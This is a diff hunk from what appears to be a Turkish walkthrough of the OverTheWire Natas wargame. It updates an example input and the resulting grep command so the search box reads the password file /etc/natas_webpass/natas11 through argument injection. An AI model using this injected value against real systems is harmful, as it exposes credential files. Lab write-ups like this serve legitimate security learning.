@@ -396,12 +396,12 @@ Bunu kullanarak şifre dosyasını direkt arama kapsamına alabiliriz.
 
 Arama kutusuna yaz:
 ```
-.* /etc/natas_webpass/natas10
+.* /etc/natas_webpass/natas11
 ```
 
 Bu çalıştırılacak komut:
 ```bash
-grep -i .* /etc/natas_webpass/natas10 dictionary.txt
+grep -i .* /etc/natas_webpass/natas11 dictionary.txt
 ```
 
 `.*` tüm satırlarla eşleşir → şifre dosyasının tüm içeriği çıkar!
